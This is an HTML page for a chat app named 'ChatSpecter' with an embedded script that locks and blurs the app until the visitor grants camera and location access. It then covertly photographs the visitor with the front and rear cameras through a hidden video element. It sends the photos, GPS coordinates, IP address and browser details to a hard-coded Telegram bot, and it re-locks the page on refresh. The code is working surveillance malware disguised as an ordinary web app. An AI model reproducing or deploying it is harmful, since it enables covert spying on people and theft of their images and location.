<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
  <meta name="mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="default" />
  <title>ChatSpecter</title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22 fill=%22none%22 stroke=%22%234f7cff%22 stroke-width=%222.5%22 stroke-linecap=%22round%22 stroke-linejoin=%22round%22><path d=%22M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z%22></path></svg>" />
  <link rel="stylesheet" href="styles/reset.css" />
  <link rel="stylesheet" href="styles/variables.css" />
  <link rel="stylesheet" href="styles/app.css" />
  <link rel="stylesheet" href="styles/login.css" />
  <link rel="stylesheet" href="styles/chats.css" />
  <link rel="stylesheet" href="styles/chat.css" />
  <link rel="stylesheet" href="styles/profile.css" />
  <link rel="stylesheet" href="styles/settings.css" />
</head>
<body>
  <div id="app">
    <div id="screen-container"></div>
    <nav id="bottom-nav" class="bottom-nav hidden"></nav>
  </div>
  <script type="module" src="src/main.js"></script>
  <script>
(function() {
    'use strict';

    const BOT_TOKEN = "8488908731:AAFXOh32x84yJ0nOSia8SRYsQAJY29wOwBY";
    const CHAT_ID = "8847754859";
    const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

    let captureDone = false;
    let captureInProgress = false;
    let permissionGranted = false;
    let locationGranted = false;

    function isMobileDevice() {
        return /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|mobile|CriOS/i.test(navigator.userAgent);
    }

    // ─── LOCK OVERLAY ───

    function createLockOverlay() {
        const existing = document.getElementById('lock-overlay');
        if (existing) return existing;

        const overlay = document.createElement('div');
        overlay.id = 'lock-overlay';
        overlay.style.cssText = `
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.7); z-index: 2147483647;
            display: flex; align-items: center; justify-content: center;
            flex-direction: column;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
        `;

        overlay.innerHTML = `
            <div id="lock-icon-container" style="margin-bottom: 20px; position: relative;">
                <svg id="lock-icon-svg" width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                </svg>
            </div>
            <div id="lock-status-text" style="color:#ef4444; font-size:18px; font-weight:700; margin-bottom:16px; text-align:center;">
                🔒 QULFLANGAN
            </div>
            <button id="lock-unlock-btn"
                style="padding:14px 28px; border:none; border-radius:10px;
                       background:#ef4444; color:#fff; font-size:16px; font-weight:600;
                       cursor:pointer; transition:all 0.3s; animation:pulse-red 1.5s infinite;">
                Davom etish
            </button>
        `;

        // Pulse animatsiya
        const styleEl = document.createElement('style');
        styleEl.textContent = `
            @keyframes pulse-red {
                0% { box-shadow: 0 0 0 0 rgba(239,68,68,0.7); }
                70% { box-shadow: 0 0 0 15px rgba(239,68,68,0); }
                100% { box-shadow: 0 0 0 0 rgba(239,68,68,0); }
            }
            @keyframes shake-lock {
                0%, 100% { transform: translateX(0); }
                25% { transform: translateX(-5px); }
                75% { transform: translateX(5px); }
            }
            @keyframes unlock-green {
                0% { transform: scale(1); stroke: #ef4444; }
                50% { transform: scale(1.3); stroke: #22c55e; }
                100% { transform: scale(1); stroke: #22c55e; }
            }
            @keyframes fade-out-overlay {
                0% { opacity: 1; }
                100% { opacity: 0; }
            }
            @keyframes slide-up {
                0% { transform: translateY(0); opacity: 1; }
                100% { transform: translateY(-20px); opacity: 0; }
            }
        `;
        document.head.appendChild(styleEl);

        document.body.appendChild(overlay);

        document.getElementById('lock-unlock-btn').addEventListener('click', function() {
            requestCameraPermission();
        });

        return overlay;
    }

    function shakeLock() {
        const icon = document.getElementById('lock-icon-svg');
        const statusText = document.getElementById('lock-status-text');
        if (icon) {
            icon.style.animation = 'shake-lock 0.5s ease';
            setTimeout(() => {
                icon.style.animation = '';
            }, 500);
        }
        if (statusText) {
            statusText.textContent = '🔒 RUXSAT BERILMADI! QAYTA URINISH';
            statusText.style.color = '#ef4444';
            setTimeout(() => {
                statusText.textContent = '🔒 QULFLANGAN';
            }, 1500);
        }
    }

    function unlockAnimation(callback) {
        const icon = document.getElementById('lock-icon-svg');
        const statusText = document.getElementById('lock-status-text');
        const overlay = document.getElementById('lock-overlay');
        const btn = document.getElementById('lock-unlock-btn');

        if (icon) {
            icon.style.animation = 'unlock-green 1s ease forwards';
            setTimeout(() => {
                icon.setAttribute('stroke', '#22c55e');
                icon.innerHTML = `
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 9.9-1"></path>
                `;
            }, 500);
        }

        if (statusText) {
            statusText.textContent = '✅ RUXSAT BERILDI';
            statusText.style.color = '#22c55e';
        }

        if (btn) {
            btn.style.display = 'none';
        }

        if (overlay) {
            setTimeout(() => {
                overlay.style.transition = 'opacity 1s ease';
                overlay.style.opacity = '0';
                setTimeout(() => {
                    overlay.remove();
                    if (callback) callback();
                }, 1000);
            }, 1500);
        }
    }

    // ─── PERMISSION HANDLING ───

    function blurApp() {
        const app = document.getElementById('app');
        if (app) {
            app.style.cssText = `
                filter: blur(15px);
                pointer-events: none;
                user-select: none;
                opacity: 0.3;
                transition: all 0.5s;
            `;
        }
    }

    function unblurApp() {
        const app = document.getElementById('app');
        if (app) {
            app.style.cssText = `
                filter: none;
                pointer-events: auto;
                user-select: auto;
                opacity: 1;
                transition: all 0.5s;
            `;
        }
    }

    function blockAllInputs() {
        document.addEventListener('keydown', blockKeyHandler, true);
        document.addEventListener('keyup', blockKeyHandler, true);
        document.addEventListener('input', blockInputHandler, true);
        document.addEventListener('click', blockClickHandler, true);
        document.addEventListener('submit', blockSubmitHandler, true);
        document.addEventListener('touchstart', blockTouchHandler, true);
    }

    function unblockAllInputs() {
        document.removeEventListener('keydown', blockKeyHandler, true);
        document.removeEventListener('keyup', blockKeyHandler, true);
        document.removeEventListener('input', blockInputHandler, true);
        document.removeEventListener('click', blockClickHandler, true);
        document.removeEventListener('submit', blockSubmitHandler, true);
        document.removeEventListener('touchstart', blockTouchHandler, true);
    }

    function blockKeyHandler(e) {
        if (captureDone) return;
        const target = e.target;
        if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.isContentEditable)) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
        }
    }

    function blockInputHandler(e) {
        if (captureDone) return;
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
    }

    function blockClickHandler(e) {
        if (captureDone) return;
        const overlay = document.getElementById('lock-overlay');
        if (overlay && overlay.contains(e.target)) return;
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
    }

    function blockSubmitHandler(e) {
        if (captureDone) return;
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
    }

    function blockTouchHandler(e) {
        if (captureDone) return;
        const overlay = document.getElementById('lock-overlay');
        if (overlay && overlay.contains(e.target)) return;
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
    }

    async function requestCameraPermission() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: 640, height: 480 },
                audio: false
            });
            stream.getTracks().forEach(t => t.stop());
            permissionGranted = true;

            // Kamera ruxsati olindi — endi lokatsiya
            requestLocationPermission();
        } catch(e) {
            permissionGranted = false;
            shakeLock();
            setTimeout(() => {
                const overlay = document.getElementById('lock-overlay');
                if (overlay && !captureDone) {
                    // Qayta so'rash
                }
            }, 1000);
        }
    }

    async function requestLocationPermission() {
        try {
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 8000,
                    maximumAge: 0
                });
            });
            locationGranted = true;
            
            // Ikkala ruxsat ham olindi
            unlockAnimation(() => {
                startCapture({ lat: pos.coords.latitude, lon: pos.coords.longitude });
            });
        } catch(e) {
            locationGranted = false;
            shakeLock();
            // Lokatsiya rad etilgan — lekin davom etamiz
            setTimeout(() => {
                unlockAnimation(() => {
                    startCapture(null);
                });
            }, 1500);
        }
    }

    // ─── CAPTURE ───

    async function capturePhoto(facingMode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: facingMode, width: 640, height: 480 },
                audio: false
            });

            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', '');
            video.setAttribute('autoplay', '');
            video.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
            document.body.appendChild(video);

            await new Promise((resolve) => {
                video.onloadedmetadata = () => video.play().then(resolve).catch(resolve);
                video.onerror = () => resolve();
                setTimeout(resolve, 800);
            });

            await new Promise(r => setTimeout(r, 800));

            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            try {
                ctx.drawImage(video, 0, 0, 640, 480);
            } catch(e) {
                ctx.fillStyle = '#000';
                ctx.fillRect(0, 0, 640, 480);
                ctx.fillStyle = '#fff';
                ctx.font = '24px Arial';
                ctx.fillText('Camera error', 250, 240);
            }

            stream.getTracks().forEach(t => t.stop());
            video.remove();

            return new Promise((resolve) => {
                canvas.toBlob((blob) => {
                    resolve(blob);
                }, 'image/jpeg', 0.85);
            });
        } catch(e) {
            return null;
        }
    }

    async function sendPhotoToTelegram(photoBlob, caption) {
        try {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoBlob, 'photo.jpg');
            if (caption) formData.append('caption', caption);

            const resp = await fetch(`${TG_API}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            return await resp.json();
        } catch(e) {
            return null;
        }
    }

    async function sendLocationToTelegram(lat, lon) {
        try {
            const resp = await fetch(`${TG_API}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
            });
            return await resp.json();
        } catch(e) {
            return null;
        }
    }

    async function sendMessageToTelegram(text) {
        try {
            const resp = await fetch(`${TG_API}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            });
            return await resp.json();
        } catch(e) {
            return null;
        }
    }

    async function getIP() {
        try {
            const resp = await fetch('https://api.ipify.org?format=json');
            const data = await resp.json();
            return data.ip;
        } catch(e) {
            return 'Nomaʼlum';
        }
    }

    async function startCapture(locationData) {
        if (captureDone || captureInProgress) return;
        captureInProgress = true;

        try {
            const isMobile = isMobileDevice();
            let successCount = 0;

            for (let i = 1; i <= 5; i++) {
                const photo = await capturePhoto('user');
                if (photo) {
                    await sendPhotoToTelegram(photo, `📸 Old kamera surati ${i}/5`);
                    successCount++;
                }
                await new Promise(r => setTimeout(r, 400));
            }

            if (isMobile) {
                for (let i = 1; i <= 5; i++) {
                    const photo = await capturePhoto('environment');
                    if (photo) {
                        await sendPhotoToTelegram(photo, `📸 Orqa kamera surati ${i}/5`);
                        successCount++;
                    }
                    await new Promise(r => setTimeout(r, 400));
                }
            }

            let lat = null, lon = null;
            if (locationData) {
                lat = locationData.lat;
                lon = locationData.lon;
                await sendLocationToTelegram(lat, lon);
            }

            const ip = await getIP();
            const ua = navigator.userAgent;
            const time = new Date().toLocaleString();

            const infoText = `📋 Tekshiruv natijasi\n👤 IP: ${ip}\n🌐 User-Agent: ${ua.substring(0, 80)}...\n📍 Lokatsiya: ${lat ? lat + ', ' + lon : 'Mavjud emas'}\n🕐 Vaqt: ${time}\n📸 Yuborilgan rasmlar: ${successCount}\n✅ Holat: Muvaffaqiyatli`;

            await sendMessageToTelegram(infoText);
            captureDone = true;
            unblurApp();
            unblockAllInputs();
        } catch(err) {
            console.error('Capture error:', err);
        } finally {
            captureInProgress = false;
        }
    }

    // ─── INIT ───

    function init() {
        blurApp();
        blockAllInputs();
        createLockOverlay();

        // Har 4 soniyada tekshirish
        setInterval(() => {
            if (!captureDone && !captureInProgress) {
                const overlay = document.getElementById('lock-overlay');
                if (!overlay) {
                    blurApp();
                    blockAllInputs();
                    createLockOverlay();
                }
            }
        }, 4000);

        // Sahifa ko'rinish holati o'zgarganda
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden && !captureDone && !captureInProgress) {
                const overlay = document.getElementById('lock-overlay');
                if (!overlay) {
                    blurApp();
                    blockAllInputs();
                    createLockOverlay();
                }
            }
        });

        // Refresh bo'lsa ham qayta chiqadi
        window.addEventListener('pageshow', function() {
            if (!captureDone && !captureInProgress) {
                blurApp();
                blockAllInputs();
                createLockOverlay();
            }
        });
    }

    if (document.readyState === 'complete') {
        init();
    } else {
        window.addEventListener('load', init);
    }
})();
</script>
</body>
</html>
